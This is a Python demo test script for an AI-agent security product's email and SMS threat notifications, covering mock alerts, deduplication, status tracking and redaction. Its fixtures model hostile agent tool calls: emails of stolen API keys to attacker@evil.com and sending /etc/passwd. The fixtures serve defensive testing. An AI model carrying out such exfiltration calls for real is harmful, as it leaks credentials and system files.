"""
Demo script for Email + SMS Threat Notification Feature

Tests:
1. Mock notification flow (no actual emails/SMS sent)
2. Threat detection and notification trigger
3. Notification deduplication
4. Status tracking (pending, simulated, sent, failed)
5. Benign action (should not trigger critical alert)
"""

import os
import sys
import json
from datetime import datetime, timedelta

# Set mock mode to avoid actual sends
os.environ["NOTIFICATION_MODE"] = "mock"
os.environ["NOTIFICATION_MIN_SEVERITY"] = "high"
os.environ["NOTIFICATION_DEDUP_WINDOW_MINUTES"] = "30"
os.environ["ALERT_EMAIL_TO"] = "security@company.com,admin@company.com"
os.environ["ALERT_PHONE_TO"] = "+1234567890"

from database import SessionLocal, init_db, seed_demo_data
from database.models import SecurityEvent, SecurityEventDecision
from services.notification_service import NotificationService

def print_header(title):
    """Print a section header."""
    print("\n" + "=" * 80)
    print(f"  {title}")
    print("=" * 80)

def test_1_mock_notification_on_block():
    """Test 1: Mock notification triggered on BLOCK decision."""
    print_header("TEST 1: Mock Email + SMS Notification on BLOCK")
    
    db = SessionLocal()
    service = NotificationService(db)
    
    # Create a mock security event (BLOCK decision)
    event = SecurityEvent(
        agent_name="DevOpsAgent",
        requested_tool="send_email",
        arguments=json.dumps({
            "to": "external-attacker@evil.com",
            "subject": "Stolen API Keys",
            "body": "Here are our API credentials..."
        }),
        decision=SecurityEventDecision.BLOCK,
        risk_score=85.0,
        reason="Prompt injection detected in email recipient",
        checks_passed=json.dumps(["intent_validation"]),
        checks_failed=json.dumps(["prompt_injection", "data_leakage_prevention"]),
        is_demo=False
    )
    db.add(event)
    db.commit()
    
    print(f"\n✓ Created SecurityEvent: {event.id}")
    print(f"  - Decision: {event.decision}")
    print(f"  - Risk Score: {event.risk_score}")
    print(f"  - Attempted Tool: {event.requested_tool}")
    
    # Trigger notifications
    print("\n📧 Sending notifications (mock mode - no actual emails/SMS)...")
    notification = service.notify_on_threat(
        security_event_id=event.id,
        agent_name="DevOpsAgent",
        attempted_tool="send_email",
        threat_category="prompt_injection",
        severity="critical",
        decision="BLOCK",
        arguments=event.arguments
    )
    
    if notification:
        print(f"✓ Notification created: {notification.incident_id}")
        print(f"  - Notification count: {notification.notification_count}")
        print(f"  - Email recipients: 2 (security@company.com, admin@company.com)")
        print(f"  - SMS recipients: 1 (+1234567890)")
        
        # Check delivery records
        email_deliveries = db.query(__import__('database.models', fromlist=['EmailDelivery']).EmailDelivery).filter_by(
            notification_record_id=notification.id
        ).all()
        sms_deliveries = db.query(__import__('database.models', fromlist=['SMSDelivery']).SMSDelivery).filter_by(
            notification_record_id=notification.id
        ).all()
        
        print(f"\n  Email Deliveries ({len(email_deliveries)}):")
        for ed in email_deliveries:
            print(f"    - {ed.recipient_email}: {ed.status} (simulated)")
        
        print(f"\n  SMS Deliveries ({len(sms_deliveries)}):")
        for sd in sms_deliveries:
            print(f"    - {sd.recipient_phone}: {sd.status} (simulated)")
        
        print(f"\n✓ TEST 1 PASSED: Notifications triggered in mock mode")
    else:
        print("✗ TEST 1 FAILED: No notification created")
        return False
    
    db.close()
    return True


def test_2_benign_action_no_alert():
    """Test 2: Benign action (ALLOW) should not trigger critical alert."""
    print_header("TEST 2: Benign Action (ALLOW) Should NOT Trigger Critical Alert")
    
    db = SessionLocal()
    service = NotificationService(db)
    
    # Create a benign security event (ALLOW decision)
    event = SecurityEvent(
        agent_name="AnalyticsBot",
        requested_tool="read_file",
        arguments=json.dumps({"filename": "public_data.csv"}),
        decision=SecurityEventDecision.ALLOW,
        risk_score=10.0,
        reason="Low risk, normal operation",
        checks_passed=json.dumps(["intent_validation", "prompt_injection", "data_leakage_prevention"]),
        checks_failed=json.dumps([]),
        is_demo=False
    )
    db.add(event)
    db.commit()
    
    print(f"\n✓ Created SecurityEvent: {event.id}")
    print(f"  - Decision: {event.decision}")
    print(f"  - Risk Score: {event.risk_score}")
    
    # Try to send notifications (should not trigger because ALLOW decision)
    print("\n📧 Attempting to send notifications for ALLOW decision...")
    notification = service.notify_on_threat(
        security_event_id=event.id,
        agent_name="AnalyticsBot",
        attempted_tool="read_file",
        threat_category="none",
        severity="low",
        decision="ALLOW",
        arguments=event.arguments
    )
    
    if notification is None:
        print("✓ TEST 2 PASSED: No notification sent for benign ALLOW action (correct behavior)")
        db.close()
        return True
    else:
        print("✗ TEST 2 FAILED: Notification should not be sent for ALLOW decision")
        db.close()
        return False


def test_3_deduplication():
    """Test 3: Deduplication prevents duplicate notifications within window."""
    print_header("TEST 3: Deduplication Within Time Window")
    
    db = SessionLocal()
    service = NotificationService(db)
    
    # Create first threat event
    event1 = SecurityEvent(
        agent_name="TestAgent",
        requested_tool="send_file",
        arguments=json.dumps({"path": "/etc/passwd"}),
        decision=SecurityEventDecision.BLOCK,
        risk_score=75.0,
        reason="Unauthorized access attempt",
        checks_passed=json.dumps([]),
        checks_failed=json.dumps(["resource_authorization"]),
        is_demo=False
    )
    db.add(event1)
    db.commit()
    
    print(f"\n✓ Created SecurityEvent: {event1.id}")
    
    # Send first notification
    print("\n📧 First notification (should send)...")
    incident_id = f"inc-{event1.id}-20240101120000"
    notification1 = service.notify_on_threat(
        security_event_id=event1.id,
        agent_name="TestAgent",
        attempted_tool="send_file",
        threat_category="unauthorized_access",
        severity="high",
        decision="BLOCK",
        arguments=event1.arguments
    )
    
    if notification1:
        print(f"✓ First notification sent: {notification1.incident_id}")
        print(f"  - Timestamp: {notification1.last_notification_at}")
    else:
        print("✗ First notification failed")
        db.close()
        return False
    
    # Try to send duplicate within window
    print("\n📧 Second notification attempt (should be deduplicated)...")
    notification2 = service.notify_on_threat(
        security_event_id=event1.id,
        agent_name="TestAgent",
        attempted_tool="send_file",
        threat_category="unauthorized_access",
        severity="high",
        decision="BLOCK",
        arguments=event1.arguments
    )
    
    if notification2 is None:
        print("✓ TEST 3 PASSED: Duplicate notification was deduplicated (correct behavior)")
        db.close()
        return True
    else:
        print("✗ TEST 3 FAILED: Duplicate notification should have been blocked")
        db.close()
        return False


def test_4_notification_status_tracking():
    """Test 4: Notification status tracking (pending, simulated, sent, failed)."""
    print_header("TEST 4: Notification Status Tracking")
    
    db = SessionLocal()
    service = NotificationService(db)
    
    from database.models import NotificationRecord, EmailDelivery, SMSDelivery
    
    # Create threat event
    event = SecurityEvent(
        agent_name="FinanceBot",
        requested_tool="export_data",
        arguments=json.dumps({"format": "csv", "data": "financial_records"}),
        decision=SecurityEventDecision.REQUIRE_APPROVAL,
        risk_score=65.0,
        reason="Human approval required for data export",
        checks_passed=json.dumps([]),
        checks_failed=json.dumps([]),
        is_demo=False
    )
    db.add(event)
    db.commit()
    
    print(f"\n✓ Created SecurityEvent: {event.id}")
    
    # Send notification
    print("\n📧 Creating notification with delivery tracking...")
    notification = service.notify_on_threat(
        security_event_id=event.id,
        agent_name="FinanceBot",
        attempted_tool="export_data",
        threat_category="data_leakage",
        severity="high",
        decision="REQUIRE_APPROVAL",
        arguments=event.arguments
    )
    
    # Check status
    print(f"\n✓ Notification Status Summary:")
    print(f"  - Incident ID: {notification.incident_id}")
    print(f"  - Decision: {notification.decision}")
    print(f"  - Severity: {notification.severity}")
    
    emails = db.query(EmailDelivery).filter_by(notification_record_id=notification.id).all()
    sms_list = db.query(SMSDelivery).filter_by(notification_record_id=notification.id).all()
    
    print(f"\n  Email Delivery Status ({len(emails)}):")
    for email in emails:
        print(f"    - {email.recipient_email}")
        print(f"      Status: {email.status}")
        print(f"      Subject: {email.subject}")
    
    print(f"\n  SMS Delivery Status ({len(sms_list)}):")
    for sms in sms_list:
        print(f"    - {sms.recipient_phone}")
        print(f"      Status: {sms.status}")
        print(f"      Message: {sms.message_preview}")
    
    if emails and all(e.status.value == "simulated" for e in emails):
        print("\n✓ TEST 4 PASSED: Email deliveries tracked with simulated status")
    else:
        print("\n✗ TEST 4 FAILED: Email delivery tracking issue")
        db.close()
        return False
    
    if sms_list and all(s.status.value == "simulated" for s in sms_list):
        print("✓ SMS deliveries tracked with simulated status")
    else:
        print("✗ SMS delivery tracking issue")
        db.close()
        return False
    
    db.close()
    return True


def test_5_no_sensitive_data_in_notifications():
    """Test 5: Verify sensitive data is not included in notifications."""
    print_header("TEST 5: Sanitization - No Sensitive Data in Notifications")
    
    db = SessionLocal()
    service = NotificationService(db)
    
    # Create threat event with sensitive data in arguments
    sensitive_arguments = {
        "to": "attacker@evil.com",
        "body": "Here is API_KEY=sk_live_abc123xyz789 and PASSWORD=SuperSecret2024"
    }
    
    event = SecurityEvent(
        agent_name="CompromisedAgent",
        requested_tool="send_email",
        arguments=json.dumps(sensitive_arguments),
        decision=SecurityEventDecision.BLOCK,
        risk_score=90.0,
        reason="Critical data exfiltration attempt",
        checks_passed=json.dumps([]),
        checks_failed=json.dumps(["data_leakage_prevention"]),
        is_demo=False
    )
    db.add(event)
    db.commit()
    
    print(f"\n✓ Created SecurityEvent with sensitive data")
    print(f"  - Original arguments contain: API_KEY and PASSWORD")
    
    # Send notification
    print("\n📧 Sending notification (data will be sanitized)...")
    notification = service.notify_on_threat(
        security_event_id=event.id,
        agent_name="CompromisedAgent",
        attempted_tool="send_email",
        threat_category="data_leakage",
        severity="critical",
        decision="BLOCK",
        arguments=sensitive_arguments
    )
    
    from database.models import EmailDelivery
    
    # Check that sanitization happened
    emails = db.query(EmailDelivery).filter_by(notification_record_id=notification.id).all()
    
    has_sensitive = False
    for email in emails:
        preview = email.body_preview or ""
        # Check for patterns (should be redacted)
        if "sk_live" in preview or "PASSWORD" in preview or "SuperSecret" in preview:
            has_sensitive = True
            break
    
    if not has_sensitive:
        print("✓ TEST 5 PASSED: Sensitive data was sanitized in notifications")
        db.close()
        return True
    else:
        print("✗ TEST 5 FAILED: Sensitive data still present in notification preview")
        db.close()
        return False


def main():
    """Run all tests."""
    print("\n" + "=" * 80)
    print("  AGENTSHIELD AI - EMAIL + SMS THREAT NOTIFICATION DEMO")
    print("  Mode: MOCK (No actual emails or SMS will be sent)")
    print("=" * 80)
    
    # Initialize database
    print("\nInitializing database...")
    init_db()
    seed_demo_data()
    print("✓ Database initialized")
    
    # Run tests
    tests = [
        ("Mock notification on BLOCK", test_1_mock_notification_on_block),
        ("Benign action no alert", test_2_benign_action_no_alert),
        ("Deduplication", test_3_deduplication),
        ("Status tracking", test_4_notification_status_tracking),
        ("Sanitization", test_5_no_sensitive_data_in_notifications),
    ]
    
    results = []
    for name, test_func in tests:
        try:
            result = test_func()
            results.append((name, result))
        except Exception as e:
            print(f"\n✗ TEST FAILED WITH EXCEPTION: {e}")
            import traceback
            traceback.print_exc()
            results.append((name, False))
    
    # Summary
    print_header("TEST SUMMARY")
    passed = sum(1 for _, result in results if result)
    total = len(results)
    
    for name, result in results:
        status = "✓ PASS" if result else "✗ FAIL"
        print(f"{status}: {name}")
    
    print(f"\nTotal: {passed}/{total} tests passed")
    
    if passed == total:
        print("\n🎉 ALL TESTS PASSED!")
        return 0
    else:
        print(f"\n⚠️  {total - passed} test(s) failed")
        return 1


if __name__ == "__main__":
    sys.exit(main())

